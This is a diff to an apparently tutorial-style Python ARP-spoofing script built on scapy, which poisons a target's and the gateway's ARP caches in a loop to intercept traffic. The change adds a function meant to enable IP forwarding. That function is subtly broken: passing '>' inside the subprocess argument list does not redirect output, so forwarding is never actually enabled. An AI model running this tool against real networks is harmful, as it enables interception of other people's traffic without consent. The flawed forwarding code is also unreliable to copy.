@@ -3,6 +3,7 @@ import sys
 
 import scapy.all as scapy
 import argparse
+import subprocess
 import time
 
 
@@ -17,6 +18,10 @@ def get_arguments():
     if not options.gateway:
         print("[-] Please specify router IP address, use --help for more info")
     return options
+
+
+def enable_prot_forwarding():
+    subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
 
 
 def get_mac(ip):
@@ -41,18 +46,16 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
+enable_prot_forwarding()
 options = get_arguments()
-
 if not options.target:
     exit()
-
 if not options.gateway:
     exit()
-
 target_ip = options.target
 gateway_ip = options.gateway
-
 sent_packets_count = 0
+
 try:
     while True:
         spoof(target_ip, gateway_ip)
